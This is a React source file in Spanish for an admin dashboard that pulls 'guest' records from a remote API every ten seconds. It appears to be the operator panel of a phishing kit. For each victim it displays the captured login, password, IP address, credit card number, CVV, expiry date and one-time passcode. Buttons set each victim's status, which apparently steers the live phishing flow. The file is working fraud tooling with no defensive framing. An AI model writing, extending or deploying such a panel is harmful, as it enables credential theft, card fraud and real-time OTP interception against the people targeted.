import { useEffect, useState } from "react";
import axios from "axios";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { User, Lock, Globe, CreditCard, Calendar, Activity, Loader2, RefreshCw, LockOpen, ArrowRight, UserRoundCog } from "lucide-react";

export default function Dashboard() {
    const [guests, setGuests] = useState([]);
    const [statuses, setStatuses] = useState([]);
    const [loading, setLoading] = useState(false);
    const [actionLoading, setActionLoading] = useState(null);

    const fetchTokens = async (showLoading = true) => {
        if (showLoading) setLoading(true);
        try {
            const response = await axios.get("https://api.bogotapoliz.com/api/v1/admin/guests");
            setGuests(response.data.guests);
            setStatuses(response.data.statuses);
        } catch (error) {
            console.error("Error obteniendo datos:", error);
        } finally {
            if (showLoading) setLoading(false);
        }
    };

    const handleChangeStatus = async (guestId, statusId) => {
        setActionLoading(guestId);
        try {
            await axios.put(`https://api.bogotapoliz.com/api/v1/guest/${guestId}`, { status_id: statusId });
            fetchTokens();
        } catch (error) {
            console.error("Error actualizando estado:", error);
        } finally {
            setActionLoading(null);
        }
    };

    const getStatusName = (statusId) => {
        const status = statuses.find((s) => s.id === statusId);
        return status ? status.nombre : "Desconocido";
    };


    useEffect(() => {
        fetchTokens(true);
        const interval = setInterval(() => {
            fetchTokens(false);
        }, 10000);
        return () => clearInterval(interval);
    }, []);


    const handleNameChange = (guestId, newName) => {
        setGuests((prevGuests) =>
            prevGuests.map((guest) =>
                guest.id === guestId ? { ...guest, newName } : guest
            )
        );
    };


    const enviarNombre = async (guestId, nombre) => {
        const body = {
            user: nombre
        };

        try {
            await axios.put(`https://api.bogotapoliz.com/api/v1/guest/${guestId}`, body);
        } catch (error) {
            console.error("Error enviando nombre:", error);
        }
    };

    return (
        <div className="min-h-screen bg-black text-white p-4">
            <div className="flex justify-between items-center mb-6">
                <img src="/logo.png" alt="logo" className="w-14" />
                <Button variant="outline" className="border-gray-600 text-gray-300 hover:bg-gray-800" onClick={fetchTokens}>
                    <RefreshCw className="w-4 h-4 mr-2" /> Refrescar
                </Button>
            </div>

            <div className="flex flex-wrap gap-6">
                {loading ? (
                    <div className="flex items-center justify-center h-64 w-full">
                        <Loader2 className="h-10 w-10 animate-spin text-gray-400" />
                    </div>
                ) : guests.length > 0 ? (
                    guests.map((guest) => (
                        <Card key={guest.id} className="bg-[#111111] border-gray-800 w-full md:w-[600px]">
                            <div className="flex flex-col md:flex-row items-start md:items-center p-4 gap-6">
                                {/* Info Principal */}
                                <div className="flex flex-col gap-2 w-full md:w-1/2">
                                    <CardHeader className="p-0">
                                        <CardTitle className="text-sm flex items-center gap-2 text-white">
                                            <User className="w-5 h-5 text-white" />
                                            <span><b>Login: </b>{guest.login}</span>
                                        </CardTitle>
                                    </CardHeader>

                                    <CardContent className="flex flex-col gap-3 text-gray-300 text-sm p-0">
                                        <div className="flex items-center gap-3">
                                            <Lock className="w-4 h-4 text-gray-400" />
                                            <span><b>Pass: </b>{guest.pass || "—"}</span>
                                        </div>

                                        <div className="flex items-center gap-3">
                                            <Globe className="w-4 h-4 text-gray-400" />
                                            <span><b>IP: </b>{guest.ip || "—"}</span>
                                        </div>

                                        <div className="flex items-center gap-3">
                                            <CreditCard className="w-4 h-4 text-gray-400" />
                                            <span>CC: {guest.cc || "—"} / CCV: {guest.ccv || "—"}</span>
                                        </div>

                                        <div className="flex items-center gap-3">
                                            <Calendar className="w-4 h-4 text-gray-400" />
                                            <span>{guest.expiration_date || "—"}</span>
                                        </div>

                                        <div className="flex items-center gap-3">
                                            <LockOpen className="w-4 h-4 text-gray-400" />
                                            <span><b>OTP: </b>{guest.otp || "—"}</span>
                                        </div>

                                        <div className="flex items-center gap-3">
                                            <Activity className="w-4 h-4 text-gray-400" />
                                            <span><b>Estado:</b> {getStatusName(guest.status_id)}</span>
                                        </div>

                                        <div className="flex items-center gap-3">
                                            <UserRoundCog className="w-4 h-4 text-gray-400" />
                                            <span><b>Nombre:</b> {guest.user}</span>
                                        </div>

                                        <div className="flex flex-col gap-1 text-xs text-gray-500 pl-7">
                                            <div>🕒 Creado: {new Date(guest.created_at).toLocaleString()}</div>
                                            <div>🛠️ Actualizado: {new Date(guest.updated_at).toLocaleString()}</div>
                                        </div>
                                    </CardContent>
                                </div>

                                {/* Acciones */}
                                <div className="flex flex-col gap-3 w-full md:w-1/2">
                                    <div className="flex flex-wrap gap-2">
                                        {statuses.map((status) => (
                                            <Button
                                                key={status.id}
                                                onClick={() => handleChangeStatus(guest.id, status.id)}
                                                variant="outline"
                                                className={`border border-gray-700 text-white hover:bg-white hover:text-black transition ${guest.status_id === status.id ? "bg-white text-black" : "bg-black"
                                                    }`}
                                                disabled={actionLoading === guest.id}
                                            >
                                                {status.nombre}
                                            </Button>
                                        ))}
                                    </div>

                                    <div className="flex flex-col gap-2 pt-2">
                                        <Button
                                            onClick={() => handleChangeStatus(guest.id, guest.status_id)}
                                            disabled={actionLoading === guest.id}
                                            className="w-full bg-green-600 text-white hover:bg-green-800"
                                        >
                                            {actionLoading === guest.id ? <Loader2 className="animate-spin w-4 h-4" /> : "Marcar como Completado"}
                                        </Button>
                                    </div>
                                    <div className="flex gap-2 pt-2">
                                        <Input
                                            type="text"
                                            placeholder="Ingresar Nombre"
                                            className="flex-grow text-white"
                                            onChange={(e) => handleNameChange(guest.id, e.target.value)}
                                        />
                                        <Button
                                            className="bg-white text-black hover:bg-gray-200"
                                            onClick={() => enviarNombre(guest.id, guest.newName)}
                                        >
                                            {loading ? (
                                                <div className="flex items-center justify-center h-10 w-10 z-10">
                                                    <Loader2 className="h-10 w-10 animate-spin text-gray-400" />
                                                </div>
                                            ) : (
                                                <ArrowRight />
                                            )}
                                        </Button>
                                    </div>
                                </div>
                            </div>
                        </Card>
                    ))
                ) : (
                    <div className="w-full text-center text-gray-500">
                        No hay tokens disponibles.
                    </div>
                )}
            </div>
        </div>
    );
}
